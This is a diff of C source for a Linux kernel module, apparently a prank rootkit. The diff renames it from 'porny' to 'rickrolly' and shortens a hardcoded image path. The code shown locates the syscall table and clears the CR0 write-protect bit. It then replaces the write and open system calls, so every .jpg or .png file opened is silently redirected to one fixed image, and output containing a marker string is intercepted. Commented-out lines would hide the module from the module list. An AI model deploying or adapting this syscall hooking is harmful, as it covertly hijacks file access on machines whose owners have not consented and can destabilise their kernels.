@@ -20,10 +20,10 @@ typedef unsigned int psize;
 typedef unsigned long psize;
 #endif
 
-int porny_init(void);
-void porny_exit(void);
-module_init(porny_init);
-module_exit(porny_exit);
+int rickrolly_init(void);
+void rickrolly_exit(void);
+module_init(rickrolly_init);
+module_exit(rickrolly_exit);
 
 asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
 asmlinkage int (*o_open)(const char __user *pathname, int flags);
@@ -43,9 +43,9 @@ psize **find(void){
     return NULL;
 }
 
-asmlinkage ssize_t porny_write(int fd, const char __user *buff, ssize_t count){
+asmlinkage ssize_t rickrolly_write(int fd, const char __user *buff, ssize_t count){
     int r;
-    char *proc_protect = ".porny";
+    char *proc_protect = ".rickrolly";
     char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
     copy_from_user(kbuff,buff,255);
     if (strstr(kbuff,proc_protect)) {
@@ -57,40 +57,40 @@ asmlinkage ssize_t porny_write(int fd, const char __user *buff, ssize_t count){
     return r;
 }
 
-asmlinkage int porny_open(const char __user *pathname, int flags){
-    char* porny_path = "/home/mia/Documents/porny/data/data-gh.jpg";
+asmlinkage int rickrolly_open(const char __user *pathname, int flags){
+    char* rickrolly_path = "data/data-gh.jpg";
     char* kbuff = (char *) kmalloc(256, GFP_KERNEL);
     copy_from_user(kbuff, pathname, 255);
     if(strstr(kbuff, ".jpg") || strstr(kbuff, ".png")){
-        copy_to_user((void*)pathname, porny_path, strlen(porny_path)+1);
+        copy_to_user((void*)pathname, rickrolly_path, strlen(rickrolly_path)+1);
 
     }
     kfree(kbuff);
     return (*o_open)(pathname, flags); 
 }
 
-int porny_init(void) {
-    printk("porny: module loaded\n");
+int rickrolly_init(void) {
+    printk("rickrolly: module loaded\n");
     //list_del_init(&__this_module.list);
     //kobject_del(&THIS_MODULE->mkobj.kobj);
     if((sys_call_table = (psize*)find())){
-       printk("porny: found syscall table\n");
+       printk("rickrolly: found syscall table\n");
     }
     else{
-       printk("porny: syscall table not found\n");
+       printk("rickrolly: syscall table not found\n");
     } 
     write_cr0(read_cr0() & (~ 0x10000));
-    o_write = (void *) xchg(&sys_call_table[__NR_write],(psize)porny_write);
-    o_open = (void *) xchg(&sys_call_table[__NR_open],(psize)porny_open);
+    o_write = (void *) xchg(&sys_call_table[__NR_write],(psize)rickrolly_write);
+    o_open = (void *) xchg(&sys_call_table[__NR_open],(psize)rickrolly_open);
     write_cr0(read_cr0() | 0x10000);
 
     return 0;
 }
 
-void porny_exit(void) {
+void rickrolly_exit(void) {
    write_cr0(read_cr0() & (~ 0x10000));
    xchg(&sys_call_table[__NR_write],(psize)o_write);
    xchg(&sys_call_table[__NR_open],(psize)o_open);
    write_cr0(read_cr0() | 0x10000);
-   printk("porny: module removed\n");
+   printk("rickrolly: module removed\n");
 }
